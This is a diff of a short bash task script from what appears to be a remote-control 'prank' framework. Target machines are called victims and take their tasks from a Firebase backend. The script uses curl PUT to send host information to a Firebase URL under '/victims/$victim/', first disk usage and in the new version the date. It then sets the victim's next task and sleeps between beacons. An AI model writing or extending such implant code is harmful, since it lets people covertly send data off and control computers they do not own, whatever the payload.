@@ -6,7 +6,7 @@
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
 # Define the task ID
-thisTaskID="prototype"
+thisTaskID="cycle2"
 
 # Get some default functions and variables from the deployment
 source "$SCRIPTDIR/deploy"
@@ -26,15 +26,15 @@ rootIteration="$2"
 # Always write data to this tasks location.
 #e.g.
 
-result=`df -h | grep '/$'`
-curl -X PUT -d "{\"df_h\" : \"$result\" }" "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
+result=`date`
+curl -X PUT -d "{\"cycle2\" : \"$result\" }" "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
 
 #If you want to swap to another task, you can do it like so:
-# setVictimTask "$victim" "default"
+setVictimTask "$victim" "cycle1"
 
 ###############################################################################
 
 #Finally, you should sleep as well. Try not to use the computer's resources too much,
 # It is only a prank, after all.
 
-sleep 15
+sleep 60
